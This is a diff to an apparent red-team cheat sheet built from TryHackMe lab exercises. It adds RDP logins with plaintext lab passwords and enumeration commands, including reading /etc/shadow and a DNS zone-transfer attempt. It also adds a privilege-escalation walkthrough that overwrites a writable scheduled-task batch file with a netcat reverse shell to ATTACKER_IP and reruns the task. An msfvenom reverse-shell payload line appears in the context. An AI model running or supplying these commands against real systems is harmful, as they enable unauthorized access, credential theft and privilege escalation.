@@ -173,7 +173,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=443 -f vba -o vb
 ## Connect via RDP
 
 ```
-xfreerdp /v:10.10.255.14 /u:thm /p:TryHackM3 +clipboard
+xfreerdp /v:10.10.40.39 /u:thm /p:TryHackM3 +clipboard
+xfreerdp /v:10.10.40.39 /u:phillip /p:Claire2008 +clipboard
 ```
 
 ## CUPP - Common User Passwords Profiler
@@ -284,3 +285,79 @@ python3 -m pip install -r requirements.txt
 python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
 ```
 
+## Network Enumeration
+
+netstat
+netstat -na
+arp -a
+
+## Linux system check
+
+```
+ls -l /etc/*-release
+cat /etc/os-release
+hostname
+cat /etc/passwd
+cat /etc/group
+sudo cat /etc/shadow
+ls -lh /var/mail/
+```
+
+## DNS Lookup
+
+```
+dig -t AXFR redteam.thm @10.10.113.132
+```
+
+## Simple Network Management Protocol (SNMP)
+
+```
+git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
+cd snmpcheck/
+gem install snmp
+chmod +x snmpcheck-1.9.rb
+```
+
+## Netcat
+
+https://eternallybored.org/misc/netcat/
+https://github.com/int0x33/nc.exe/
+
+## Windows Privilege Escalation
+
+https://benheater.com/thm-windows-privesc/
+
+## Manipulate scheduled task
+
+Check which user runs the scheduled task:
+```
+C:\> schtasks /query /tn vulntask /fo list /v
+Folder: \
+HostName:                             THM-PC1
+TaskName:                             \vulntask
+Task To Run:                          C:\tasks\schtask.bat
+Run As User:                          taskusr1
+```
+
+Check if current user can change the bat file
+```
+C:\> icacls c:\tasks\schtask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+```
+
+Inject netcat in the bat file
+```
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+```
+
+Start listening on the attack machine
+```
+nc -lvp 4444
+```
+
+Rerun the task
+```
+schtasks /run /tn vulntask
+```
